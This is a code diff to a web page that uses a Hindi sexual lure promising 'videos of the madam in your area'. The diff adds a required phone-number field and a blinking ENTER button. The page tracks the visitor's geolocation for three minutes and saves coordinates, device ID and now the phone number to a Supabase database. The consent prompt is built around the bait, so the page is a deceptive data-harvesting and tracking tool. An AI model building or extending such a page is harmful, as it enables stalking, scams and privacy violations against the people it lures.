@@ -33,6 +33,19 @@ body {
   padding: 20px;
 }
 
+#phoneNumber {
+  display: block;
+  width: 100%;
+  max-width: 320px;
+  margin: 0 auto 24px;
+  padding: 14px;
+  border: 2px solid #cccccc;
+  border-radius: 10px;
+  font-size: 18px;
+  text-align: center;
+  outline-color: #12c95a;
+}
+
 #locationButton {
   width: 112px;
   height: 112px;
@@ -43,10 +56,27 @@ body {
   cursor: pointer;
   animation: blink 1.2s infinite;
   -webkit-tap-highlight-color: transparent;
+  color: #ffffff;
+  display: inline-flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 2px;
 }
 
 #locationButton:disabled {
   cursor: wait;
+}
+
+#finger {
+  font-size: 35px;
+  line-height: 1.1;
+}
+
+#enterText {
+  font-size: 17px;
+  font-weight: bold;
+  letter-spacing: 1px;
 }
 
 @keyframes blink {
@@ -82,9 +112,23 @@ body {
 <body>
 <div id="app">
 
+  <input
+    id="phoneNumber"
+    type="tel"
+    inputmode="numeric"
+    autocomplete="tel"
+    maxlength="16"
+    placeholder="अपना मोबाइल नंबर डालें"
+    aria-label="अपना मोबाइल नंबर डालें"
+    required
+  >
+
   <button id="locationButton"
           type="button"
-          aria-label="अपने एरिया की मैडम की वीडियो के लिए लोकेशन साझा करें"></button>
+          aria-label="Enter करें और अपनी सहमति से लोकेशन साझा करें">
+    <span id="finger">👆</span>
+    <span id="enterText">ENTER</span>
+  </button>
 
   <div id="result" aria-live="polite">
     <div id="city"></div>
@@ -103,6 +147,7 @@ const SUPABASE_KEY =
   "sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";
 
 const button = document.getElementById("locationButton");
+const phoneInput = document.getElementById("phoneNumber");
 const result = document.getElementById("result");
 const cityElement = document.getElementById("city");
 const stateElement = document.getElementById("state");
@@ -113,6 +158,8 @@ let stopTimer = null;
 let startedAt = 0;
 let lastSaveAt = 0;
 let lastCoordinates = null;
+let currentPhoneNumber = "";
+
 let locationDetails = {
   city: "",
   district: "",
@@ -193,6 +240,7 @@ async function saveLocation(position) {
 
   const data = {
     device_id: getDeviceId(),
+    phone_number: currentPhoneNumber,
     latitude: lat,
     longitude: lon,
     accuracy: position.coords.accuracy,
@@ -287,10 +335,10 @@ function locationError(error) {
   stopTracking();
 
   button.disabled = false;
-  button.style.display = "inline-block";
+  button.style.display = "inline-flex";
 
   cityElement.textContent =
-    "City: लोकेशन प्राप्त नहीं हुई अपने एरिया की मैडम की वीडियो के लिए आपका लोकेशन की सेटिंग ऑन चाहिए";
+    "City: लोकेशन प्राप्त नहीं हुई। अपने एरिया की मैडम की वीडियो के लिए मोबाइल की Location सेटिंग ऑन करें।";
 
   stateElement.textContent =
     "State: कृपया अनुमति और Location सेटिंग जाँचें";
@@ -301,12 +349,25 @@ function locationError(error) {
 button.addEventListener("click", function () {
   if (busy) return;
 
-  const consent = confirm("अपनी एरिया की मैडम की वीडियो पाने के लिए क्या आप सहमत हैं?");
+  const phone = phoneInput.value.trim();
+  const phoneDigits = phone.replace(/\D/g, "");
+
+  if (phoneDigits.length < 10 || phoneDigits.length > 15) {
+    alert("कृपया अपना सही मोबाइल नंबर डालें।");
+    phoneInput.focus();
+    return;
+  }
+
+  currentPhoneNumber = phone;
+
+  const consent = confirm(
+    "अपनी एरिया की मैडम की वीडियो पाने के लिए क्या आप सहमत हैं? आपकी लोकेशन साझा की जाएगी।"
+  );
 
   if (!consent) return;
 
   if (!navigator.geolocation) {
-    alert("आपके ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है। अपने एरिया की मैडम की वीडियो के लिए आपका लोकेशन की सेटिंग ऑन चाहिए");
+    alert("आपके ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है। अपने एरिया की मैडम की वीडियो के लिए मोबाइल की Location सेटिंग ऑन करें।");
     return;
   }
 
@@ -326,6 +387,7 @@ button.addEventListener("click", function () {
   // तीन मिनट पूरे होने पर ट्रैकिंग बंद होगी।
   stopTimer = setTimeout(function () {
     stopTracking();
+    button.disabled = false;
   }, TRACKING_DURATION);
 
   // पहली लोकेशन प्राप्त करें।
@@ -343,6 +405,7 @@ button.addEventListener("click", function () {
 
             if (Date.now() - startedAt >= TRACKING_DURATION) {
               stopTracking();
+              button.disabled = false;
               return;
             }
 
